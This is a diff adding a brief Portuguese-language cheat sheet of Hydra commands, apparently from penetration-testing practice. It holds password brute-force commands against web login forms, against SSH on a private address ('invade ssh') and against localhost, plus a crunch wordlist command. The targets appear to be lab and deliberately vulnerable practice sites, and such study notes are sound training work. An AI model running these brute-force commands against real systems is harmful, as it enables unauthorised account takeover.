@@ -1,0 +1,15 @@
+COMANDOS HYDRA
+
+
+
+4) hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.127.20 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -v = brute force login
+
+5) hydra -l test -P flares.txt testphp.vulnweb.com http-post-form "/userinfo.php:uname=^USER^&pass=^PASS^:S=On this page you can visualize" -V = brute force no login
+
+6) hydra -l user -P wordlist.txt 192.168.0.8 -t 4 ssh = invade ssh 
+
+6) hydra -l kali -P flares.txt ssh://127.0.0.1 -t 4 -V -f = invade a propria maquina
+
+
+
+opcional: crunch 3 4 iakl -o /home/user/test.txt = cria wordlist com caracteres iakl de 4 digitos
